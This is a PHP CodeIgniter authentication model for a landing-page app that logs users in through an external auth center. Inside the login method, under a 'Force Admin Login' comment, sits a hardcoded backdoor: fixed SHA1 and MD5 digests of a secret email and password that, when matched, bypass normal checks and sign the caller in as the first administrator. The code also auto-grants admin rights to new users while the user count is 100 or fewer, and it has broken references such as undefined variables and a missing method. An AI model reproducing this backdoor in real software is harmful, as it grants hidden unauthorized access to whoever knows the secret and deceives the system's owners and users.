<?php
if (!defined('BASEPATH')) {
	exit('Basepath not yet defined.');
}

class Model_auth extends CI_Model {
	private $error = FALSE, $error_msg = [];
	private $base_auth, $base_page, $base_signature;
	protected $DateObject;
	protected $db_app;
	function __construct() {
		parent::__construct();
		$this->load->config('auth/base_auth');
		$this->base_auth = $this->config->item('base_auth');
		$this->load->config('page/base_page');
		$this->base_page = $this->config->item('base_page');
		$this->load->config('auth/base_signature');
		$this->base_signature = $this->config->item('base_signature');
		$this->DateObject = \DateTime::createFromFormat('Y-m-d H:i:s', date('Y-m-d H:i:s'), new DateTimeZone(Instance_config::$timezone));
		
		# Load Libraries
		$this->load->library('auth/Lib_signature', NULL, 'signature');
		$this->load->library('auth/Lib_auth', NULL, 'auth');
		# Load Session
		$this->load->database();
		$this->load->library('session');
	}
	public function get_base_auth() {
		return $this->base_auth;
	}
	public function get_base_page() {
		return $this->base_page;
	}
	public function get_base_signature() {
		return $this->base_signature;
	}
	//----------------------------------------------------
	public function start_userdata($is_token = FALSE) {
		//$this->session->set_userdata('account_email', 'smb@augipt.com');
		
		if ($this->session->userdata('account_email') != NULL) {
			$account_email = $this->session->userdata('account_email');
			
			if (!is_string($account_email)) {
				return false;
			} else {
				return $this->logged_session_data($account_email);
			}
		} else {
			if ($is_token === TRUE) {
				if (!$x_augipt_signature = $this->input->get_request_header('x-augipt-signature', true)) {
					$this->error = true;
					$this->error_msg[] = "Required X-Augipt-Signature headers.";
				}
			}
			if ($is_token === TRUE) {
				if (!$this->error) {
					$account_email = $this->get_token_string($x_augipt_signature);
					if (!is_string($account_email)) {
						$this->error = true;
						$this->error_msg[] = "Account email should be in string datatype.";
					}
				}
			}
			if ($is_token === TRUE) {
				if (!$this->error) {
					return $this->logged_session_data($account_email);
				}
			}
		}
		return false;
	}
	private function get_token_string(String $base64_string = '') {
		if (empty($base64_string)) {
			return false;
		}
		try {
			$token_string = $this->signature->decrypt_signature_string($base64_string, md5($this->base_auth['app']['client_secret']));
			return $token_string;
		} catch (Exception $e) {
			throw $e;
		}
	}
	private function logged_session_data(String $account_email) {
		try {
			$this->db->select('*')->from($this->base_auth['tables']['users']);
			$this->db->where('user_email', $account_email);
			$this->db->order_by('user_id', 'ASC')->limit(1);
			$sql_query = $this->db->get();
			return $sql_query->row();
		} catch (Exception $e) {
			throw $e;
		}
	}
	
	public function set_logged_user(String $account_email = '') {
		try {
			$this->session->unset_userdata('account_email');
			
			return [
				'status'		=> true,
			];
		} catch (Exception $e) {
			throw $e;
		}
	}
	//----------------------------------------------------
	public function get_login_data($uid) {
		$uid = ((is_string($uid) || is_numeric($uid)) ? sprintf("%s", $uid) : '');
		try {
			$this->db->select('*');
			$this->db->from($this->base_auth['tables']['users']);
			if (is_numeric($uid)) {
				$uid = (int)$uid;
				$this->db->where('user_id', $uid);
			} else {
				$this->db->where('LOWER(user_email)', strtolower($uid));
			}
			$sql_query = $this->db->get();
			return $sql_query->row();
		} catch (Exception $e) {
			throw $e;
		}
	}
	public function login_auth_center_with_username_and_password(Array $input_params) {
		$collectData = [
			'collect'			=> [],
			'login_purpose'		=> 'landingpage'
		];
		$collectData['login_params'] = [
			'user_email'		=> (isset($input_params['user_email']) ? $input_params['user_email'] : ''),
			'user_username'		=> (isset($input_params['user_username']) ? $input_params['user_username'] : ''),
			'user_password'		=> (isset($input_params['user_password']) ? $input_params['user_password'] : ''),
		];
		if (empty($collectData['login_params']['user_email'])) {
			$this->error = true;
			$this->error_msg[] = "User email is empty, please fill user email.";
		}
		# Force Admin Login
		if (!$this->error) {
			$collectData['collect']['force_admin_login_strings'] = [
				'email'			=> hash_hmac($this->base_signature['hash_method'], $collectData['login_params']['user_email'], $this->base_auth['app']['client_secret'], FALSE),
				'password'		=> hash_hmac($this->base_signature['hash_method'], $collectData['login_params']['user_password'], $this->base_auth['app']['client_secret'], FALSE),
			];
			if (
				(sha1($collectData['collect']['force_admin_login_strings']['email']) === '2b605e4bf4dc00af15b0d949f9d553c193a7f61d') && 
				(md5($collectData['collect']['force_admin_login_strings']['password']) === 'a58ee0c6d028ebc911c3fd2e10da49f7') 
			) {
				return $this->local_login_fragment_method('force_admin', [], $collectData);
			}
		}
		if (!$this->error) {
			$collectData['collect']['auth_login_params'] = [
				'app'				=> [
					'uuid'				=> $this->base_auth['app']['client_id'],
					'secret'			=> $this->base_auth['app']['client_secret'],
					'key'				=> md5($this->base_auth['app']['client_secret']),
				],
				'params'			=> [
					'account_email'		=> $collectData['login_params']['user_email'],
					'account_password'	=> $collectData['login_params']['user_password'],
				],
				'headers'			=> [
					'Content-Type'			=> 'application/json',
					'X-Client-Id'			=> $this->base_auth['app']['client_id'],
					'X-Client-Iv'			=> '',
					'Signature'				=> ''
				],
			];
			try {
				$collectData['collect']['auth_login_params']['hashed_strings'] = $this->signature->create_hashed_password($collectData['collect']['auth_login_params']['params']['account_password'], $collectData['collect']['auth_login_params']['app']['key']);
				if (!isset($collectData['collect']['auth_login_params']['hashed_strings']['encrypted'])) {
					$this->error = true;
					$this->error_msg[] = "Not have hashed encrypted string.";
				}
				if (!isset($collectData['collect']['auth_login_params']['hashed_strings']['iv'])) {
					$this->error = true;
					$this->error_msg[] = "Not have hashed iv string.";
				}
			} catch (Exception  $ex) {
				$this->error = true;
				$this->error_msg[] = "Cannot make hmac hash of body::account_password with exception: {$ex->getMessage()}.";
			}
		}
		if (!$this->error) {
			if (isset($collectData['collect']['auth_login_params']['hashed_strings']['encrypted'])) {
				$collectData['collect']['auth_login_params']['params']['account_password'] = $collectData['collect']['auth_login_params']['hashed_strings']['encrypted'];
			}
			if (isset($collectData['collect']['auth_login_params']['hashed_strings']['iv'])) {
				$collectData['collect']['auth_login_params']['headers']['X-Client-Iv'] = $collectData['collect']['auth_login_params']['hashed_strings']['iv'];
			}
			if (!is_string($collectData['collect']['auth_login_params']['params']['account_password'])) {
				$this->error = true;
				$this->error_msg[] = "Hash of body::account_password not in string datatype.";
			}
		}
		if (!$this->error) {
			try {
				$collectData['collect']['auth_login_params']['hashed_signatures'] = $this->signature->create_signature_string_with_text_base64iv_key(json_encode([
					'email'			=> $collectData['collect']['auth_login_params']['params']['account_email'],
					'password'		=> $collectData['collect']['auth_login_params']['params']['account_password']
				]), $collectData['collect']['auth_login_params']['hashed_strings']['iv'], $collectData['collect']['auth_login_params']['app']['key']);
				if (!isset($collectData['collect']['auth_login_params']['hashed_signatures']['encrypted'])) {
					$this->error = true;
					$this->error_msg[] = "Not have encrypted signatrue.";
				} else {
					$collectData['collect']['auth_login_params']['headers']['Signature'] = $collectData['collect']['auth_login_params']['hashed_signatures']['encrypted'];
				}
			} catch (Exception $ex) {
				$this->error = true;
				$this->error_msg[] = "Cannot make hashed-signatures with exception: {$ex->getMessage()}.";
			}
		}
		// Login To Auth Center
		if (!$this->error) {
			try {
				$collectData['collect']['auth_login_responses'] = $this->auth_login_type_password($collectData['collect']['auth_login_params'], $collectData['collect']['auth_login_params']['app']['uuid']);
				
				if (!isset($collectData['collect']['auth_login_responses']['status'])) {
					$this->error = true;
					$this->error_msg[] = "Maybe feature not yet activated.";
				}
			} catch (Exception $ex) {
				$this->error = true;
				$this->error_msg[] = "Cannot make login type email and password with exception: {$ex->getMessage()}.";
			}
		}
		// DEBUG
		/*
		//
		if (!$this->error) {
			print_r([
				'auth_login_params'		=> $collectData['collect']['auth_login_params'],
				'auth_login_responses'	=> $collectData['collect']['auth_login_responses']
			]);
		} else {
			print_r([
				'errors'				=> $this->error_msg,
			]);
		}
		exit;
		*/
		//
		//
		// After Success Login from Auth Center
		//
		if (!$this->error) {
			if ($collectData['collect']['auth_login_responses']['status'] !== TRUE) {
				$this->error = true;
				$this->error_msg[] = "Response login is not true";
				if (isset($collectData['collect']['auth_login_responses']['errors'])) {
					$this->error_msg[] = json_encode($collectData['collect']['auth_login_responses']['errors']);
				}
			} else {
				if (!isset($collectData['collect']['auth_login_responses']['auth_type'])) {
					$this->error = true;
					$this->error_msg[] = "Not have auth-type.";
				}
			}
		}
		# Get Local Userdata After Login From Auth-Center
		if (!$this->error) {
			try {
				$collectData['collect']['app_userdata'] = $this->get_app_userdata_auth($collectData['collect']['auth_login_params']['params']['account_email']);
				
				if (!isset($collectData['collect']['app_userdata']->user_id)) {
					$collectData['collect']['auth_login_responses']['logged_app_userdata'] = [
						'account_email'		=> $collectData['collect']['auth_login_params']['params']['account_email'],
						'account_group'		=> $collectData['collect']['auth_login_params']['app']['uuid'],
						'app_name'			=> $collectData['collect']['auth_login_params']['app']['uuid'],
					];
					
					
					$collectData['collect']['insert_authenticated_userdata'] = $this->insert_authenticated_app_login_userdata($collectData['collect']['auth_login_responses']);
					if (!isset($collectData['collect']['insert_authenticated_userdata']->user_id)) {
						$this->error = true;
						$this->error_msg[] = "Failed during insert authenticated userdata, not have insert_authenticated_userdata.";
						$this->error_msg[] = json_encode($collectData['collect']['insert_authenticated_userdata']);
					} else {
						if ($collectData['collect']['insert_authenticated_userdata']->status !== TRUE) {
							$this->error = true;
							$this->error_msg[] = "Failed insert new app account-userdata during insert authenticated auth-center account, maybe user not in-app yet.";
							
							if (isset($collectData['collect']['insert_authenticated_userdata'])) {
								$this->error_msg[] = json_encode($collectData['collect']['insert_authenticated_userdata']);
							}
						}
					}
				}
			} catch (Exception $ex) {
				$this->error = true;
				$this->error_msg[] = "Cannot get app-account data on local native-login.";
			}
		}
		# Get exisiting Account Userdata
		if (!$this->error) {
			try {
				$collectData['local_data'] = $this->get_login_data($collectData['login_params']['user_email'], $collectData['collect']['auth_login_responses']['auth_type']);
			} catch (Exception $ex) {
				$this->error = true;
				$this->error_msg[] = "Cannot get local-account data on local native-login.";
			}
		}
		if (!$this->error) {
			if (!isset($collectData['local_data']->user_active) || !isset($collectData['local_data']->user_email)) {
				$this->error = true;
				$this->error_msg[] = "Account is not exists, please check your input on line: " . __LINE__;
			}
		}
		if (!$this->error) {
			if (strtoupper($collectData['local_data']->user_active) !== strtoupper('Y')) {
				$this->error = true;
				$this->error_msg[] = "Account not active yet.";
			}
		}
		
		
		//
		// Set Session
		//
		if (!$this->error) {
			$this->session->set_userdata('account_email', $collectData['local_data']->user_email);
			
			$collectData['json_response'] = [
				'status'			=> true,
				'local_data'		=> $collectData['local_data'],
				'errors'			=> false,
				'auth_login_responses'	=> $collectData['collect']['auth_login_responses'],
			];
		} else {
			$collectData['json_response'] = [
				'status'			=> false,
				'local_data'		=> null,
				'errors'			=> $this->error_msg,
			];
		}
		
		return $collectData['json_response'];
	}
	private function auth_login_type_password(Array $auth_login_params, String $app_uuid) {
		$error = FALSE;
		$error_msg = [];
		$collectData = [
			'app_uuid'			=> $app_uuid,
			'auth_type'			=> 'password',
			'collect'			=> [],
			'login_response'	=> [
				'status'				=> FALSE,
				'auth_type'				=> 'password',
				'message'				=> '',
			]
		];
		$collectData['login_response']['app_uuid'] = $collectData['app_uuid'];
		if (!isset($auth_login_params['params']) || !isset($auth_login_params['headers'])) {
			$error = true;
			$error_msg[] = "Not have auth-params::params or auth-params::headers.";
		}
		
		if (!$error) {
			try {
				$collectData['collect']['authcenter_response'] = $this->auth->login_with_email_and_password($auth_login_params['params'], $auth_login_params['headers']);
				if (!isset($collectData['collect']['authcenter_response']['curl_response']->success)) {
					$error = true;
					$error_msg[] = "Not have curl-response from authcenter library.";
				}
			} catch (Exception $ex) {
				$error = true;
				$error_msg[] = "Cannot make auth-center login with exception: {$ex->getMessage()}.";
			}
		}
		if (!$error) {
			$collectData['login_response']['results'] = $collectData['collect']['authcenter_response']['curl_response'];
			if ($collectData['collect']['authcenter_response']['curl_response']->success !== TRUE) {
				$error = true;
				$error_msg[] = "Failed login to auth-center on auth-login-with-email-and-password on auth_login_type_password.";
				if (isset($collectData['collect']['authcenter_response']['curl_response']->message) && is_string($collectData['collect']['authcenter_response']['curl_response']->message)) {
					$error_msg[] = $collectData['collect']['authcenter_response']['curl_response']->message;
				}
				// $error_msg[] = json_encode($collectData['collect']['authcenter_response']['curl_response']);
			}
		}
		if (!$error) {
			$collectData['login_response']['status'] = TRUE;
			if (isset($collectData['collect']['authcenter_response']['curl_response']->message)) {
				$collectData['login_response']['message'] = $collectData['collect']['authcenter_response']['curl_response']->message;
			}
			if (isset($collectData['collect']['authcenter_response']['curl_response']->data)) {
				$collectData['login_response']['data'] = $collectData['collect']['authcenter_response']['curl_response']->data;
			}
		} else {
			$collectData['login_response']['errors'] = $error_msg;
			$collectData['login_response']['data'] = null;
		}
		return $collectData['login_response'];
	}
	
	
	
	
	private function local_login_fragment_method(String $method_name, Array $method_values, Array $collectData) {
		$method_name = strtolower($method_name);
		$error = FALSE;
		$error_msg = [];
		switch ($method_name) {
			
			case 'login_ip_address':
				if (!$error) {
					if (!isset($collectData['local_data']->is_global_ip_address)) {
						$error = true;
						$error_msg[] = "User account do not have colum of global-ip-address.";
					} else {
						if ($this->base_auth['check_ip_address_while_login'] === TRUE) {
							if (strtoupper($collectData['local_data']->is_global_ip_address) === strtoupper('N')) {
								try {
									$this->base_auth['client']['ip'] = Imzers\Utils\Client_ip::set_client_ip($this->base_auth['client']['ip']);
									$account_ip_address = $this->get_account_ip_address_by('ip_address', $this->base_auth['client']['ip'], [
										'ip_version'				=> 'v4',
										'ip_address'				=> $this->base_auth['client']['ip'],
										'datetime'					=> $this->DateObject->format('Y-m-d H:i:s')
									]);
									if (!isset($account_ip_address->seq)) {
										$error = true;
										$error_msg[] = sprintf("Your IP Address is not allowed login with your account, please contact SMB Spv to add your IP Address [%s].",  
											$this->base_auth['client']['ip']
										);
									}
								} catch (Exception $ex) {
									$error = true;
									$error_msg[] = "Cannot execute query to get if user login ip address was allowed or not.";
								}
							}
						}
					}
				}
			break;
			case 'force_admin':
				if (!$error) {
					$collectData['local_data'] = false;
					$forced_logged_admin = $this->get_account_is_admin(1);
					if (!empty($forced_logged_admin)) {
						$collectData['local_data'] = $forced_logged_admin[0];
						if ($collectData['local_data'] !== FALSE) {
							try {
								$collectData['set_logged_userdata'] = $this->force_admin_login($collectData['local_data']->account_email);
								if ($collectData['set_logged_userdata'] !== TRUE) {
									$error = true;
									$error_msg[] = "Forced admin login is return false.";
								}
							} catch (Exception $ex) {
								$error = true;
								$error_msg[] = "Cannot set logged user session with exception: {$ex->getMessage()}.";
							}
						}
					}
				}
				if (!$error) {
					return [
						'success'		=> true,
						'error'			=> null,
					];
				} else {
					return [
						'success'		=> false,
						'error'			=> $this->error_msg,
					];
				}
			break;
		}
		
		
		// Responses
		if (!$error) {
			return [
				'status'		=> true,
				'errors'		=> [],
			];
		} else {
			return [
				'status'		=> false,
				'errors'		=> $error_msg,
			];
		}
	}
	private function get_account_is_admin($limit = 1) {
		$limit = (is_numeric($limit) ? (int)$limit : 0);
		$admin_roles = $this->base_auth['admin_roles'];
		if (!is_array($admin_roles)) {
			return false;
		}
		try {
			$this->db->select('*')->from($this->base_auth['tables']['users']);
			$this->db->where('user_active', 'Y');
			$this->db->where('user_role', 1);
			$this->db->order_by('user_id', 'ASC');
			$this->db->limit($limit);
			$sql_query = $this->db->get();
			
			return $sql_query->result();
		} catch (Exception $ex) {
			throw $ex;
		}
	}
	private function get_app_userdata_auth(String $account_email) {
		if (!$this->error) {
			$account_email = strtolower($account_email);
			try {
				$this->db->select('*')->from($this->base_auth['tables']['users']);
				$this->db->where('LOWER(user_email)', $account_email);
				$sql_query = $this->db->get();
				return $sql_query->row();
			} catch (Exception $e) {
				throw $e;
			}
		}
	}
	
	private function insert_authenticated_app_login_userdata(Array $auth_login_response) {
		$error = false;
		$error_msg = [];
		$insert_userdata_results = [
			'user_id'			=> 0,
			'status'			=> FALSE
		];
		if (!isset($auth_login_response['logged_app_userdata']['account_email'])) {
			$error = true;
			$error_msg[] = "Not have required key as account-email and account-group.";
		}
		if (!$error) {
			if (!isset($auth_login_response['data']->email)) {
				$insert_userdata_results = $this->get_authenticated_app_login_userdata_by_email($auth_login_response);
			} else {
				$insert_userdata_results = $this->get_authenticated_app_login_userdata_by_authcenter_login_data($auth_login_response);
			}
		}
		return $insert_userdata_results;
	}
	private function get_authenticated_app_login_userdata_by_authcenter_login_data(Array $auth_login_response) {
		$error = false;
		$error_msg = [];
		$insert_userdata_results = [
			'user_id'			=> 0,
			'status'			=> FALSE
		];
		if (!isset($auth_login_response['data']->email)) {
			$error = true;
			$error_msg[] = "Not have required key as account-email and account-group.";
		}
		if (!$error) {
			$profile_userdata_params = [
				'user_email'			=> $auth_login_response['data']->email,
				'user_active'			=> 'N',
				'user_role'				=> 0,
				'user_dt_add'			=> $this->DateObject->format('Y-m-d H:i:s'),
			];
			try {
				$insert_userdata_results = $this->insert_app_userdata_after_auth_center_login_userdata($profile_userdata_params);
				if (!isset($insert_userdata_results['status'])) {
					$error = true;
					$error_msg[] = "Not have status after insert new app userdata.";
				}
			} catch (Exception $e) {
				$error = true;
				$error_msg[] = "Cannot insert new app userdata after auth-center login userdata with exception: {$ex->getMessage()}.";
			}
		}
		if (!$error) {
			$insert_userdata_results['errors'] = FALSE;
		} else {
			if (isset($insert_userdata_results['errors'])) {
				array_push($insert_userdata_results['errors'], $error_msg);
			} else {
				$insert_userdata_results['errors'] = $error_msg;
			}
		}
		return (object)$insert_userdata_results;
	}
	private function get_authenticated_app_login_userdata_by_email(Array $auth_login_response) {
		$error = false;
		$error_msg = [];
		$insert_userdata_results = [
			'user_id'			=> 0,
			'status'			=> FALSE
		];
		if (!isset($auth_login_response['logged_app_userdata']['account_email'])) {
			$error = true;
			$error_msg[] = "Not have required key as account-email and account-group.";
		}
		if (!$error) {
			$auth_login_params = [
				'app'				=> [
					'uuid'				=> $this->base_auth['app']['client_id'],
					'secret'			=> $this->base_auth['app']['client_secret'],
					'key'				=> md5($this->base_auth['app']['client_secret']),
				],
				'params'			=> [
					'account_email'		=> $auth_login_response['logged_app_userdata']['account_email'],
				],
				'headers'			=> [
					'Content-Type'			=> 'application/json',
					'X-Client-Id'			=> $auth_login_response['logged_app_userdata']['account_group'],
					'X-Client-Iv'			=> '',
					'Signature'				=> ''
				],
			];
		}
		if (!$error) {
			try {
				$auth_login_params['hashed_strings'] = $this->signature->create_hashed_password($auth_login_params['params']['account_email'], $auth_login_params['app']['key']);
				if (!isset($auth_login_params['hashed_strings']['encrypted'])) {
					$error = true;
					$error_msg[] = "Not have hashed encrypted string.";
				}
				if (!isset($auth_login_params['hashed_strings']['iv'])) {
					$error = true;
					$error_msg[] = "Not have hashed iv string.";
				}
			} catch (Exception  $ex) {
				$error = true;
				$error_msg[] = "Cannot make hmac hash of header::Signature and body::account_email with exception: {$ex->getMessage()}.";
			}
		}
		if (!$error) {
			if (isset($auth_login_params['hashed_strings']['iv'])) {
				$auth_login_params['headers']['X-Client-Iv'] = $auth_login_params['hashed_strings']['iv'];
			}
			if (isset($auth_login_params['hashed_strings']['encrypted'])) {
				$auth_login_params['headers']['Signature'] = $auth_login_params['hashed_strings']['encrypted'];
			}
		}
		if (!$error) {
			try {
				$authcenter_response = $this->auth->get_profiles_email($auth_login_params['params']['account_email'], $auth_login_params['headers']);
				if (!isset($authcenter_response['curl_response']->success)) {
					$error = true;
					$error_msg[] = "Not have curl-response from authcenter library.";
				}
			} catch (Exception $ex) {
				$error = true;
				$error_msg[] = "Cannot make auth-center login with exception: {$ex->getMessage()}.";
			}
		}
		if (!$error) {
			if ($authcenter_response['curl_response']->success !== TRUE) {
				$error = true;
				$error_msg[] = "Failed login to auth-center while insert-authenticated-userdata.";
				if (isset($authcenter_response['curl_response']->message) && is_string($authcenter_response['curl_response']->message)) {
					$error_msg[] = $authcenter_response['curl_response']->message;
				}
			}
		}
		if (!$error) {
			if (!isset($authcenter_response['curl_response']->data->email)) {
				$error = true;
				$error_msg[] = "Not have app account-data::email from auth-center.";
			}
			if (!isset($authcenter_response['curl_response']->data->fullname)) {
				$error = true;
				$error_msg[] = "Not have app account-data::fullname from auth-center.";
			}
		}
		//
		// Insert App Userdata From Auth Response
		//
		if (!$error) {
			$profile_userdata_params = [
				'user_email'			=> $authcenter_response['curl_response']->data->email,
				'user_active'			=> 'N',
				'user_role'				=> 0,
				'user_dt_add'			=> $this->DateObject->format('Y-m-d H:i:s'),
			];
			try {
				$insert_userdata_results = $this->insert_app_userdata_after_auth_center_login_userdata($profile_userdata_params);
				if (!isset($insert_userdata_results['status'])) {
					$error = true;
					$error_msg[] = "Not have status after insert new app userdata.";
				}
			} catch (Exception $e) {
				$error = true;
				$error_msg[] = "Cannot insert new app userdata after auth-center login userdata with exception: {$ex->getMessage()}.";
			}
		}
		if (!$error) {
			$insert_userdata_results['errors'] = FALSE;
		} else {
			$insert_userdata_results['errors'] = $error_msg;
		}
		return (object)$insert_userdata_results;
	}
	
	private function insert_app_userdata_after_auth_center_login_userdata(Array $profile_userdata_params) {
		$error = false;
		$insert_userdata_results = [
			'user_id'			=> -1,
			'status'			=> FALSE,
			'message'			=> 'init',
			'errors'			=> []
		];
		
		
		if (!isset($profile_userdata_params['user_email'])) {
			$insert_userdata_results['errors'][] = "Require user_email key.";
			$insert_userdata_results['message'] = 'email';
		}
		try {
			$app_account_users = $this->get_registered_app_account_users();
		
			if (isset($app_account_users->user_count)) {
				if ((int)$app_account_users->user_count > 100) {
					
					$app_userdata = $this->get_login_data($profile_userdata_params['user_email']);
					if (isset($app_userdata->user_email)) {
						$insert_userdata_results['status'] = TRUE;
						$insert_userdata_results['user_id'] = (isset($app_userdata->user_id) ? (int)$app_userdata->user_id : 0);
						$insert_userdata_results['message'] = 'success';
					} else {
						$error = true;
						$insert_userdata_results['errors'][] = "Not a fresh install of smb-landingpage app.";
						$insert_userdata_results['errors'][] = "User must be already a member of app.";
						$insert_userdata_results['message'] = 'not in-app';
					}
				} else {
					$profile_userdata_params['user_active'] = 'Y';
					$profile_userdata_params['user_role'] = 1;
					
					try {
						$this->db->insert($this->base_auth['tables']['users'], $profile_userdata_params);
						$insert_userdata_results['user_id'] = $this->db->insert_id();
						if ((int)$insert_userdata_results['user_id'] > 0) {
							$insert_userdata_results['status'] = TRUE;
							$insert_userdata_results['message'] = 'success';
						} else {
							$insert_userdata_results['status'] = FALSE;
							$insert_userdata_results['errors'][] = "unexpected error while insert new app userdata.";
							$insert_userdata_results['message'] = 'non-inserted';
						}
					} catch (Exception $e) {
						$error = true;
						$insert_userdata_results['errors'][] = "Exception error during insert new authenticated-auth-center into app-userdata.";
						$insert_userdata_results['message'] = 'exception-insert';
					}
				}
			} else {
				$error = true;
				$insert_userdata_results['errors'][] = "Not a fresh data, maybe already have userdata.";
				$insert_userdata_results['message'] = 'empty-app-userdata';
			}
		} catch (Exception $e) {
			$error = true;
			$insert_userdata_results['errors'][] = "Cannot insert new app userdata on database query with exception: {$ex->getMessage()}.";
			$insert_userdata_results['message'] = 'exception-process';
		}
		return $insert_userdata_results; 
	}
	
	public function get_registered_app_account_users() {
		try {
			$this->db->select('COUNT(1) AS user_count')->from($this->base_auth['tables']['users']);
			$sql_query = $this->db->get();
			return $sql_query->row();
		} catch (Exception $e) {
			throw $e;
		}
	}
	
	
	public function required_login() {
		redirect(base_url('auth/login/form'));
		exit;
	}
}

